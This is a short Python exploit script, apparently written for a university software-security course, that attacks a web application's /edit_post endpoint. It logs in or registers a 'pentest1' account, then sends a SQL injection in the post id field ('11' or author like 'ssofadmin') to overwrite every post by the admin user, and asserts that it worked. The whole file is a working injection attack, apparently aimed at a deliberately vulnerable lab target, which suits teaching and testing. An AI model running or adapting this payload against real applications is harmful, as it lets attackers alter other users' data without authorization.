import requests, sys, re, time, random, string

params = { 
    'username': 'pentest1',
    'password': 'pentest1'
}
if len(sys.argv) == 2:
    url = sys.argv[1]
else:
    url = 'http://1e20646419f415513131d83be200e0326560be38193c43242109fc7f9223.project.ssof.rnl.tecnico.ulisboa.pt'

resource = '/login'

s = requests.Session()

path = url + resource
r = s.post(url=path, data=params)

if len(s.cookies) == 0:
    resource = '/register'
    path = url + resource
    r = s.post(url=path, data=params)
    resource = '/login'
    path = url + resource
    r = s.post(url=path, data=params)
    if len(s.cookies) == 0:
        print("Login && registration not successful! :(")
        print("Usage:\n\tpython3 vulnX.py [username] [password]\n")
        exit(2)

rind = str(random.randrange(1, 1000))
target_username = 'ssofadmin'
new_post = 'GlobalEdit ' + rind + ' made by ' + params['username']

resource = '/edit_post'
path = url + resource

params = { 
    'id': '11\' or author like \'' + target_username,
    'content': new_post,
    'type': "Public"
}
r = s.post(url=path, data=params)

print("Changed " + str(str(r.text).count(new_post)) + " posts of user " + target_username)

assert new_post in r.text
